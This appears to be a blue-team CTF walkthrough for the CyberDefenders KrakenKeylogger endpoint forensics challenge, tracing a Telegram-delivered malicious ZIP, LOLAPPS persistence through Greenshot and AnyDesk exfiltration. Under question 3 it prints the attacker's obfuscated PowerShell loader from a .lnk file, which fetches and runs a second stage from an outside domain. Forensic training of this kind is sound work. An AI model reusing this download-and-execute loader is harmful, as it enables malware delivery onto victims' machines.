# <a href="https://cyberdefenders.org/blueteam-ctf-challenges/krakenkeylogger/">KrakenKeylogger</a>

**Platform:** CyberDefenders

**Scenario:** An employee at a large company was assigned a task with a two-day deadline. Realizing that he could not complete the task in that timeframe, he sought help from someone else. After one day, he received a notification from that person who informed him that he had managed to finish the assignment and sent it to the employee as a test. However, the person also sent a message to the employee stating that if he wanted the completed assignment, he would have to pay $160.

The helper's demand for payment revealed that he was actually a threat actor. The company's digital forensics team was called in to investigate and identify the attacker, determine the extent of the attack, and assess potential data breaches. The team must analyze the employee's computer and communication logs to prevent similar attacks in the future.

**Category:** Endpoint Forensics

**Difficulty:** Medium

**Files:** `challenge directory`

**Tools:** `FTK Imager` `Autopsy` `Registry Explorer` `MFTECmd.exe` `Timeline Explorer`

> [FTK Imager](https://www.exterro.com/digital-forensics-software/ftk-imager) is a free data preview and imaging tool used to acquire electronic evidence in a forensically sound manner by creating copies of computer data without making changes to the original evidence.

**Note:** In this walkthrough, we will use the FlareVM to analyze the provided files. If you have not set it up yet, I highly recommend following this [malware analysis lab](https://github.com/mmhgwyjs/malware-analysis-lab/blob/main/README.md) guide for assistance with your installation.

## **Preparations**


## **Questions and Answers**

***1. What is the the web messaging app the employee used to talk to the attacker?***

\Users\OMEN\AppData\Local\Microsoft\Windows\Notifications

![image](https://github.com/user-attachments/assets/64055a1d-a3e2-470f-b86b-38cb65425219)

telegram

![image](https://github.com/user-attachments/assets/85866de4-c737-4544-8035-b49f340e375b)


***2. What is the password for the protected ZIP file sent by the attacker to the employee?***

@1122d

![image](https://github.com/user-attachments/assets/3edfae11-f421-45b7-aa33-9018fba648fc)

***3. What domain did the attacker use to download the second stage of the malware?***

masherofmasters.cyou

![image](https://github.com/user-attachments/assets/63bd4db8-6ac7-4f51-b051-c843fc46905d)

lecmd.exe -f templet.lnk

![image](https://github.com/user-attachments/assets/e8d8a357-e98e-4382-a054-f15be12b63e1)

```
Relative Path: ..\..\..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Arguments: -ExecutionPolicy UnRestricted $ProgressPreference = 0;
function nvRClWiAJT($OnUPXhNfGyEh){$OnUPXhNfGyEh[$OnUPXhNfGyEh.Length..0] -join('')};
function sDjLksFILdkrdR($OnUPXhNfGyEh){
$vecsWHuXBHu = nvRClWiAJT $OnUPXhNfGyEh;
for($TJuYrHOorcZu = 0;$TJuYrHOorcZu -lt $vecsWHuXBHu.Length;$TJuYrHOorcZu += 2){
try{$zRavFAQNJqOVxb += nvRClWiAJT $vecsWHuXBHu.Substring($TJuYrHOorcZu,2)}
catch{$zRavFAQNJqOVxb += $vecsWHuXBHu.Substring($TJuYrHOorcZu,1)}};$zRavFAQNJqOVxb};
$NpzibtULgyi = sDjLksFILdkrdR 'aht1.sen/hi/coucys.erstmaofershma//s:tpht';
$cDkdhkGBtl = $env:APPDATA + '\' + ($NpzibtULgyi -split '/')[-1];
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
$wbpiCTsGYi = wget $NpzibtULgyi -UseBasicParsing;
[IO.File]::WriteAllText($cDkdhkGBtl, $wbpiCTsGYi);
& $cDkdhkGBtl;
sleep 3;
rm $cDkdhkGBtl;
Icon Location: C:\Windows\System32\imageres.dll
```

certutil -hashfile templet.lnk

![image](https://github.com/user-attachments/assets/d54c5405-fb24-4238-a75b-e59f122b2bdc)

8b49368462651afa265273151a1e7d4ea19e6347

![image](https://github.com/user-attachments/assets/f248f584-9520-4fd4-bc8d-371d1f3e4938)

masherofmasters.cyou

***4. What is the name of the command that the attacker injected using one of the installed LOLAPPS on the machine to achieve persistence?***

jlhgfjhdflghjhuhuh

![image](https://github.com/user-attachments/assets/04777a51-a34c-4585-96d2-f58e56faafc7)

Users/OMEN/AppData/Roaming/Greenshot/Greenshot.ini

https://lolapps-project.github.io/lolapps/Desktop/greenshot/

***5. What is the complete path of the malicious file that the attacker used to achieve persistence?***

C:\Users\OMEN\AppData\Local\Temp\templet.lnk

***6. What is the name of the application the attacker utilized for data exfiltration?***

anydesk

C:\Windows\System32\sru\SRUDB.dat

![image](https://github.com/user-attachments/assets/ac7ca00d-a42e-4eac-af1d-7d5fa80dc3f8)

C:\Users\flrvm2\Desktop\Tools\Forensic\SrumECmd.lnk -f C:\Users\flrvm2\Documents\CD\119-KrakenKeyLogger\SRUDB.dat --csv C:\Users\flrvm2\Documents\CD\119-KrakenKeyLogger

![image](https://github.com/user-attachments/assets/d114f3cf-5b1b-46ad-999b-cde203640422)

![image](https://github.com/user-attachments/assets/c6f0edb3-98c8-4c28-972c-72b587e6b8cb)

![image](https://github.com/user-attachments/assets/5e92c965-4342-4137-b008-f2cea32f2468)

***7. What is the IP address of the attacker?***

77.232.122.31

![image](https://github.com/user-attachments/assets/6a2f2274-e976-45ef-9c9d-b42101969ee5)

\Users\OMEN\AppData\Roaming\Anydesk

